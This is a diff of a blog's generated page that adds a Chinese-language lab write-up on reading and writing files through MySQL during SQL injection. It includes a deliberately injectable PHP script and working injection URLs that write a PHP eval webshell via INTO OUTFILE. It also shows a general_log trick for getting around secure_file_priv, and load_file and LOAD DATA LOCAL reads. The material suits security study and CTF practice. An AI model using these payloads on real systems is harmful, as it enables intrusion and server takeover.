@@ -6,15 +6,26 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | Abyss&#39;s Blog</title>
+  <title>Mysql读取/写入文件 | Abyss&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Abyss&#39;s Blog">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="背景当有sql注入时，除了读取数据，常见的比如写webshell，读取flag等 测试代码12345678910&amp;lt;?php$id = $_GET[&apos;id&apos;];$mysqli  = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;);$sql = &quot;select * from user where id=&quot;.$id;$result = $mysqli-&amp;gt;qu">
+<meta name="keywords" content="CTF,Web,SQLi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Mysql读取&#x2F;写入文件">
+<meta property="og:url" content="http://yoursite.com/2019/09/24/mysql-read-write-file-20190924/index.html">
 <meta property="og:site_name" content="Abyss&#39;s Blog">
+<meta property="og:description" content="背景当有sql注入时，除了读取数据，常见的比如写webshell，读取flag等 测试代码12345678910&amp;lt;?php$id = $_GET[&apos;id&apos;];$mysqli  = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;);$sql = &quot;select * from user where id=&quot;.$id;$result = $mysqli-&amp;gt;qu">
 <meta property="og:locale" content="en">
+<meta property="og:image" content="http://yoursite.com/2019/09/24/mysql-read-write-file-20190924/1.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/24/mysql-read-write-file-20190924/2.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/24/mysql-read-write-file-20190924/3.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/24/mysql-read-write-file-20190924/4.png">
+<meta property="og:image" content="http://yoursite.com/2019/09/24/mysql-read-write-file-20190924/5.png">
+<meta property="og:updated_time" content="2019-09-24T03:22:42.772Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Abyss&#39;s Blog">
+<meta name="twitter:title" content="Mysql读取&#x2F;写入文件">
+<meta name="twitter:description" content="背景当有sql注入时，除了读取数据，常见的比如写webshell，读取flag等 测试代码12345678910&amp;lt;?php$id = $_GET[&apos;id&apos;];$mysqli  = new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;&quot;,&quot;test&quot;);$sql = &quot;select * from user where id=&quot;.$id;$result = $mysqli-&amp;gt;qu">
+<meta name="twitter:image" content="http://yoursite.com/2019/09/24/mysql-read-write-file-20190924/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Abyss&#39;s Blog" type="application/atom+xml">
   
@@ -148,36 +159,146 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
+            <article id="post-mysql-read-write-file-20190924" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
   
+    <h1 class="article-title" itemprop="name">
+      Mysql读取/写入文件
+    </h1>
   
-    
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2019" class="archive-year">2019</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/24/mysql-read-write-file-20190924/" class="archive-article-date">
+
+        
+        <a href="/2019/09/24/mysql-read-write-file-20190924/" class="archive-article-date">
   	<time datetime="2019-09-24T03:13:22.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-24</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/24/mysql-read-write-file-20190924/">Mysql读取/写入文件</a>
-    </h1>
-  
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>当有sql注入时，除了读取数据，常见的比如写webshell，读取flag等</p>
+<h1 id="测试代码"><a href="#测试代码" class="headerlink" title="测试代码"></a>测试代码</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$mysqli  = <span class="keyword">new</span> mysqli(<span class="string">"localhost"</span>,<span class="string">"root"</span>,<span class="string">""</span>,<span class="string">"test"</span>);</span><br><span class="line">$sql = <span class="string">"select * from user where id="</span>.$id;</span><br><span class="line">$result = $mysqli-&gt;query($sql);</span><br><span class="line">$row = $result-&gt;fetch_assoc();</span><br><span class="line"><span class="keyword">echo</span> $row[<span class="string">'username'</span>];</span><br><span class="line">$result-&gt;free();</span><br><span class="line">$mysqli-&gt;close();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
-        <div class="article-info info-on-right">
-          
+<a id="more"></a>
+<h1 id="mysql配置选项"><a href="#mysql配置选项" class="headerlink" title="mysql配置选项"></a>mysql配置选项</h1><h2 id="secure-file-priv"><a href="#secure-file-priv" class="headerlink" title="secure_file_priv"></a>secure_file_priv</h2><p><a href="https://dev.mysql.com/doc/refman/5.6/en/server-system-variables.html" target="_blank" rel="noopener">官方说明 5.6版本</a><br>| Property |Value  |<br>| — | — |<br>| Command-Line Format |–secure-file-prive=dri_name  |<br>|System Variable  |secure_file_priv  |<br>|Scope  |Global  |<br>|Dynamic  |No  |<br>|Type  |String  |<br>|Default Value(&gt;=5.6.34)  |platform specific  |<br>|Default Value(&lt;=5.6.33)  |empty string  |<br>|Valid Values(&gt;=5.6.34)  |empty string<br>dirname<br>NULL  |<br>|Valid Values(&lt;=5.6.33)  |empty string<br>dirname  |</p>
+<p>仅在版本大于等于5.6.34时，secure_file_priv的值才可以设置为NULL，如果设置为NULL，<code>load_file()</code>,<code>load data</code>,<code>select ... into outfile</code>就都不能用了，如果设置为具体路径，那么只能读取设置文件下的内容（路径必须存在，不会主动创建文件夹），如果设置为空则没有限制。</p>
+<h2 id="local-infile"><a href="#local-infile" class="headerlink" title="local_infile"></a>local_infile</h2><table>
+<thead>
+<tr>
+<th>Property</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Command-Line Format</td>
+<td>–local-infile[={OFF|ON}]</td>
+</tr>
+<tr>
+<td>System Variable</td>
+<td>local_infile</td>
+</tr>
+<tr>
+<td>Scope</td>
+<td>Global</td>
+</tr>
+<tr>
+<td>Dynamic</td>
+<td>Yes</td>
+</tr>
+<tr>
+<td>Type</td>
+<td>Boolean</td>
+</tr>
+<tr>
+<td>Default Value</td>
+<td>On</td>
+</tr>
+</tbody></table>
+<p>该配置项仅影响<code>load data</code>命令，当配置为On时，客户端可以在客户端本地读取数据至数据库，即可以<code>load data local</code></p>
+<h1 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h1><p>secure_file_priv = “/tmp/mysql”</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/var/www/html/mysql<span class="comment"># cd /tmp/mysql/</span></span><br><span class="line">root@kali:/tmp/mysql<span class="comment"># ls</span></span><br><span class="line">flag</span><br><span class="line">root@kali:/tmp/mysql<span class="comment"># cat flag</span></span><br><span class="line">flag&#123;secure_file_priv&#125;</span><br><span class="line">root@kali:/tmp/mysql<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file"></a>load_file</h2><p>存在</p>
+<img src="/2019/09/24/mysql-read-write-file-20190924/1.png">
+<p>不存在</p>
+<img src="/2019/09/24/mysql-read-write-file-20190924/2.png">
+<p>路径可以用十六进制</p>
+<img src="/2019/09/24/mysql-read-write-file-20190924/3.png">
+<p>查看secure_file_priv</p>
+<img src="/2019/09/24/mysql-read-write-file-20190924/4.png">
+
+<h2 id="select-…-into-outfile"><a href="#select-…-into-outfile" class="headerlink" title="select … into outfile"></a>select … into outfile</h2><p><a href="https://dev.mysql.com/doc/refman/5.6/en/select-into.html" target="_blank" rel="noopener">官方说明 5.6版本</a><br>表格数据</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | passwd   |</span><br><span class="line">|  2 | abc      | aaaaaaa  |</span><br><span class="line">|  3 | xss      | xsstest  |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line">mysql&gt;</span><br></pre></td></tr></table></figure>
+
+<p>demo 语句</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"/tmp/mysql/data2.txt"</span> </span><br><span class="line">    <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span> </span><br><span class="line">    <span class="keyword">optionally</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span> </span><br><span class="line">    <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\n'</span> </span><br><span class="line"><span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
+
+<p>或者</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"/tmp/mysql/data3.txt"</span> </span><br><span class="line">    <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">','</span> </span><br><span class="line">    <span class="keyword">optionally</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span> </span><br><span class="line">    <span class="keyword">lines</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">'\n'</span> ;</span><br></pre></td></tr></table></figure>
+
+<p>写入的数据一样</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp/mysql<span class="comment"># cat data2.txt</span></span><br><span class="line">1,<span class="string">"admin"</span>,<span class="string">"passwd"</span></span><br><span class="line">2,<span class="string">"abc"</span>,<span class="string">"aaaaaaa"</span></span><br><span class="line">3,<span class="string">"xss"</span>,<span class="string">"xsstest"</span></span><br><span class="line">root@kali:/tmp/mysql<span class="comment"># cat data3.txt</span></span><br><span class="line">1,<span class="string">"admin"</span>,<span class="string">"passwd"</span></span><br><span class="line">2,<span class="string">"abc"</span>,<span class="string">"aaaaaaa"</span></span><br><span class="line">3,<span class="string">"xss"</span>,<span class="string">"xsstest"</span></span><br><span class="line">root@kali:/tmp/mysql<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="写webshell"><a href="#写webshell" class="headerlink" title="写webshell"></a>写webshell</h3><p>可以控制select内容的<br><code>http://192.168.154.140/mysql/sql.php?id=0 union select 1,&quot;&lt;?php @eval($_GET[&#39;exec&#39;]);?&gt;&quot;,2 into outfile &quot;/tmp/mysql/shell.php&quot;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp/mysql<span class="comment"># cat shell.php</span></span><br><span class="line">1       &lt;?php @<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'exec'</span>]);?&gt;    2</span><br><span class="line">root@kali:/tmp/mysql<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p>如果控制不了select内容的<br><code>http://192.168.154.140/mysql/sql.php?id=1 into outfile &quot;/tmp/mysql/shell1.php&quot; fields terminated by &quot;&lt;?php @eval($_GET[&#39;exec&#39;]);?&gt;&quot;</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp/mysql<span class="comment"># cat shell1.php</span></span><br><span class="line">1&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'exec'</span>]);?&gt;admin&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_GET</span>[<span class="string">'exec'</span>]);?&gt;passwd</span><br><span class="line">root@kali:/tmp/mysql<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="其他失败测试"><a href="#其他失败测试" class="headerlink" title="其他失败测试"></a>其他失败测试</h3><p>select … into dumpfile可以用来带代替select … into outfile，不过dumpfile只能写入一行数据，而且无法使用<code>fields terminated by</code>等选项，所以没用</p>
+<p>无法控制select内容时，使用了<code>fields terminated by</code>来写入内容，但其实还有一个<code>enclosed by</code>选项，首先这个必须配合<code>filelds</code>一起出现，而且使用简单的单双引号不报错，但是一换成shell的内容，出现报错<br><code>ERROR 1083 (42000): Field separator argument is not what is expected; check the manual</code></p>
+<h2 id="绕过secure-file-priv"><a href="#绕过secure-file-priv" class="headerlink" title="绕过secure-file-priv"></a>绕过secure-file-priv</h2><p>这个选项无法动态修改，因此可以利用日志写入webshell，不过需要有一个mysql的执行任意命令的连接，权限是root</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> general_log=<span class="keyword">on</span>;</span><br><span class="line"><span class="keyword">set</span> <span class="keyword">global</span> genaral_log_file=<span class="string">'/var/www/html/mysql/'</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="string">"&lt;?php @eval($_GET['exec']);?&gt;"</span>;</span><br></pre></td></tr></table></figure>
+
+<p>写入shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/var/www/html/mysql<span class="comment"># cat shelllog.php</span></span><br><span class="line">/usr/sbin/mysqld, Version: 5.6.30-1 ((Debian)). started with:</span><br><span class="line">Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock</span><br><span class="line">Time                 Id Command    Argument</span><br><span class="line">190922 16:12:41     2 Query     select <span class="string">"&lt;?php @eval(<span class="variable">$_GET</span>['exec']);?&gt;"</span></span><br><span class="line">root@kali:/var/www/html/mysql<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2019/09/24/mysql-read-write-file-20190924/5.png">
+
+<p><strong>PS</strong><br>实际测试时，mysql用户没有对web目录的写权限，因此无法将<code>general_log_file</code>指向到web目录下的文件。<br>改了下web目录的权限之后，可以写shell了，但是生成的shell文件，对于web应用用户没有读权限，因此也运行失败了。</p>
+<h2 id="LOAD-DATA"><a href="#LOAD-DATA" class="headerlink" title="LOAD DATA"></a>LOAD DATA</h2><p><a href="https://dev.mysql.com/doc/refman/5.6/en/load-data.html" target="_blank" rel="noopener">官方说明 5.6版本</a></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">LOAD</span> <span class="keyword">DATA</span></span><br><span class="line">    [<span class="keyword">LOW_PRIORITY</span> | <span class="keyword">CONCURRENT</span>] [<span class="keyword">LOCAL</span>]</span><br><span class="line">    <span class="keyword">INFILE</span> <span class="string">'file_name'</span></span><br><span class="line">    [<span class="keyword">REPLACE</span> | <span class="keyword">IGNORE</span>]</span><br><span class="line">    <span class="keyword">INTO</span> <span class="keyword">TABLE</span> tbl_name</span><br><span class="line">    [<span class="keyword">PARTITION</span> (partition_name [, partition_name] ...)]</span><br><span class="line">    [<span class="built_in">CHARACTER</span> <span class="keyword">SET</span> charset_name]</span><br><span class="line">    [&#123;<span class="keyword">FIELDS</span> | <span class="keyword">COLUMNS</span>&#125;</span><br><span class="line">        [<span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'string'</span>]</span><br><span class="line">        [[<span class="keyword">OPTIONALLY</span>] <span class="keyword">ENCLOSED</span> <span class="keyword">BY</span> <span class="string">'char'</span>]</span><br><span class="line">        [<span class="keyword">ESCAPED</span> <span class="keyword">BY</span> <span class="string">'char'</span>]</span><br><span class="line">    ]</span><br><span class="line">    [<span class="keyword">LINES</span></span><br><span class="line">        [<span class="keyword">STARTING</span> <span class="keyword">BY</span> <span class="string">'string'</span>]</span><br><span class="line">        [<span class="keyword">TERMINATED</span> <span class="keyword">BY</span> <span class="string">'string'</span>]</span><br><span class="line">    ]</span><br><span class="line">    [<span class="keyword">IGNORE</span> <span class="built_in">number</span> &#123;<span class="keyword">LINES</span> | <span class="keyword">ROWS</span>&#125;]</span><br><span class="line">    [(col_name_or_user_var</span><br><span class="line">        [, col_name_or_user_var] ...)]</span><br><span class="line">    [<span class="keyword">SET</span> col_name=&#123;expr | <span class="keyword">DEFAULT</span>&#125;,</span><br><span class="line">        [, col_name=&#123;expr | <span class="keyword">DEFAULT</span>&#125;] ...]</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"/tmp/sql.txt"</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">","</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span>;</span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">"/tmp/sql2.txt"</span> <span class="keyword">fields</span> <span class="keyword">terminated</span> <span class="keyword">by</span> <span class="string">","</span> <span class="keyword">optionally</span> <span class="keyword">enclosed</span> <span class="keyword">by</span> <span class="string">'"'</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/tmp<span class="comment"># cat sql.txt</span></span><br><span class="line"><span class="string">"1"</span>,<span class="string">"admin"</span>,<span class="string">"passwd"</span></span><br><span class="line"><span class="string">"2"</span>,<span class="string">"abc"</span>,<span class="string">"aaaaaaa"</span></span><br><span class="line"><span class="string">"3"</span>,<span class="string">"xss"</span>,<span class="string">"xsstest"</span></span><br><span class="line">root@kali:/tmp<span class="comment"># cat sql2.txt</span></span><br><span class="line">1,<span class="string">"admin"</span>,<span class="string">"passwd"</span></span><br><span class="line">2,<span class="string">"abc"</span>,<span class="string">"aaaaaaa"</span></span><br><span class="line">3,<span class="string">"xss"</span>,<span class="string">"xsstest"</span></span><br><span class="line">root@kali:/tmp<span class="comment">#</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>local_infile=Off</strong><br>远程连接数据库，读取本地文件加上<code>local</code>关键词，读取客户端机器上的文件</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MySQL [<span class="built_in">test</span>]&gt; select * from user;</span><br><span class="line">Empty <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [<span class="built_in">test</span>]&gt; load data <span class="built_in">local</span> infile <span class="string">"/mnt/d/sql.txt"</span> into table user fields terminated by <span class="string">","</span> enclosed by <span class="string">'"'</span>;</span><br><span class="line">ERROR 1148 (42000): The used <span class="built_in">command</span> is not allowed with this MySQL version</span><br><span class="line">MySQL [<span class="built_in">test</span>]&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>local_infile=On</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">MySQL [<span class="built_in">test</span>]&gt; select * from user;</span><br><span class="line">Empty <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [<span class="built_in">test</span>]&gt; load data <span class="built_in">local</span> infile <span class="string">"/mnt/d/sql.txt"</span> into table user fields terminated by <span class="string">","</span> enclosed by <span class="string">'"'</span>;</span><br><span class="line">Query OK, 3 rows affected (0.01 sec)</span><br><span class="line">Records: 3  Deleted: 0  Skipped: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">MySQL [<span class="built_in">test</span>]&gt; select * from user;</span><br><span class="line">+----+----------+----------+</span><br><span class="line">| id | username | password |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">|  1 | admin    | passwd   |</span><br><span class="line">|  2 | abc      | aaaaaaa  |</span><br><span class="line">|  3 | xss      | xsstest  |</span><br><span class="line">+----+----------+----------+</span><br><span class="line">3 rows <span class="keyword">in</span> <span class="built_in">set</span> (0.00 sec)</span><br><span class="line"></span><br><span class="line">MySQL [<span class="built_in">test</span>]&gt;</span><br></pre></td></tr></table></figure>
+      
+
+      
+        <div class="page-reward">
+          <a href="javascript:;" class="page-reward-btn tooltip-top">
+            <div class="tooltip tooltip-east">
+            <span class="tooltip-item">
+              赏
+            </span>
+            <span class="tooltip-content">
+              <span class="tooltip-text">
+                <span class="tooltip-inner">
+                  <p class="reward-p"><i class="icon icon-quo-left"></i>谢谢你请我吃糖果<i class="icon icon-quo-right"></i></p>
+                  <div class="reward-box">
+                    
+                    
+                  </div>
+                </span>
+              </span>
+            </span>
+          </div>
+          </a>
+        </div>
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
@@ -197,65 +318,106 @@
 		</ul>
 	</div>
 
-          
+      
 
+      
+
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2019/09/24/mysql-read-write-file-20190924/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2019/09/10/sqli-join-20190910/" class="archive-article-date">
-  	<time datetime="2019-09-10T05:25:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2019/09/10/sqli-join-20190910/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">JOIN绕过逗号以及列名过滤</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
+        
+        
+    </div>
+</aside>
+
+
+
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2019/09/10/sqli-join-20190910/">JOIN绕过逗号以及列名过滤</a>
-    </h1>
+  
   
 
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">CTF</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">Web</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SQLi</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
   
 
-    
+  
+
+  
 
 
           </div>
@@ -278,8 +440,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
